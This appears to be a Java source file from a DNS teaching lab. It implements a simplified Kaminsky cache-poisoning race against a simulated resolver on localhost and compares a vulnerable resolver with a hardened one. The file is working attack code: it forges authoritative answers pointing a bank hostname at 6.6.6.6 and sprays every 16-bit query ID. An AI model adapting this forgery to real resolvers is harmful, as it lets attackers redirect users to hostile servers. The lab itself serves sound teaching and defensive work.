package dns.attack;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;
import dns.core.Hub;
import dns.core.Json;
import dns.server.AuthServer;
import dns.server.Cache;
import dns.server.Resolver;
import dns.wire.Message;
import dns.wire.Message.RR;

/**
 * Cache-poisoning race (the attack behind the 2008 Kaminsky disclosure, simplified to one name).
 *
 * The resolver asks the slow authoritative server for bank.cse.myuniv.edu. While that real answer
 * is on its way (we delay it by 1.5 s), the attacker floods the resolver with forged answers
 * "bank = 6.6.6.6", one for every possible 16-bit query ID. If the resolver uses a fixed source
 * port and does not check where the answer came from, one forgery matches and gets cached.
 * With a random source port, a source-address check and 0x20 case randomisation, nothing lands.
 */
public final class Poisoner {

    public static final String TARGET = "bank.cse.myuniv.edu", EVIL = "6.6.6.6", REAL = "192.168.151.20";
    public static final long DELAY = 1500;

    public static synchronized String run(Resolver res, AuthServer cse, boolean secureMode) throws Exception {
        boolean was = res.secure;
        res.secure = secureMode;
        res.cache.removeName(TARGET);
        res.resolve("www.cse.myuniv.edu", Message.A, true);       // learn the cse servers first: only one upstream query is left to race
        long rej0 = res.rejected.get();
        cse.delays.put(TARGET, DELAY);
        Hub.I.event("ATTACK", "poisoning race started against the " + (secureMode ? "SECURE" : "VULNERABLE") + " resolver for " + TARGET);
        AtomicReference<Resolver.Result> result = new AtomicReference<>();
        Thread victim = new Thread(() -> result.set(res.resolve(TARGET, Message.A, true)), "victim-lookup");
        long t0 = System.currentTimeMillis();
        victim.start();
        Thread.sleep(80);                                            // the resolver's query is now in flight
        int port = res.lastUpstreamPort;

        // forged answer: QR=1 AA=1, question = target, answer = target A 6.6.6.6 for a whole day
        Message f = new Message();
        f.qr = true; f.aa = true;
        f.qd.add(new Message.Question(TARGET, Message.A));
        f.an.add(new RR(TARGET, Message.A, 86400, EVIL));
        byte[] pkt = f.encode();
        InetAddress lo = InetAddress.getByName("127.0.0.1");
        int sent = 0, start = (int) (Math.random() * 65536);
        long s0 = System.nanoTime();
        try (DatagramSocket atk = new DatagramSocket()) {
            DatagramPacket dp = new DatagramPacket(pkt, pkt.length, lo, Resolver.VULN_PORT);
            // the attacker can only guess: the classic fixed port, and (pretending it even learned it) the real one
            int[] ports = port == Resolver.VULN_PORT ? new int[]{Resolver.VULN_PORT} : new int[]{Resolver.VULN_PORT, port};
            for (int k = 0; k < 65536 && victim.isAlive(); k++) {
                int id = (start + k) & 0xFFFF;
                pkt[0] = (byte) (id >> 8); pkt[1] = (byte) id;
                for (int pt : ports) { dp.setPort(pt); atk.send(dp); sent++; }
            }
        }
        double sprayMs = (System.nanoTime() - s0) / 1e6;
        victim.join(10000);
        cse.delays.remove(TARGET);
        long total = System.currentTimeMillis() - t0;
        Cache.Entry e = res.cache.get(Resolver.LAB, TARGET, Message.A);
        String cached = e == null || e.negative() ? "(nothing)" : e.rrs.get(0).data;
        boolean poisoned = EVIL.equals(cached);
        long rej = res.rejected.get() - rej0;
        res.secure = was;
        Resolver.Result r = result.get();
        List<RR> ans = r == null ? List.of() : r.answers;
        Hub.I.event(poisoned ? "POISONED" : "DEFENDED", poisoned
                ? TARGET + " now resolves to " + EVIL + " for everyone using this resolver (" + res.lastAccept + ")"
                : "forged answers rejected or never arrived; " + TARGET + " = " + cached);
        return Json.obj("mode", secureMode ? "secure" : "vulnerable", "sent", sent, "sprayMs", Math.round(sprayMs), "totalMs", total, "delay", DELAY,
                "upstreamPort", port, "rejected", rej, "poisoned", poisoned, "cached", cached, "accepted", res.lastAccept,
                "answer", ans.isEmpty() ? "" : ans.get(ans.size() - 1).data, "real", REAL, "evil", EVIL, "target", TARGET,
                "ttl", e == null ? 0 : e.ttl);
    }
}
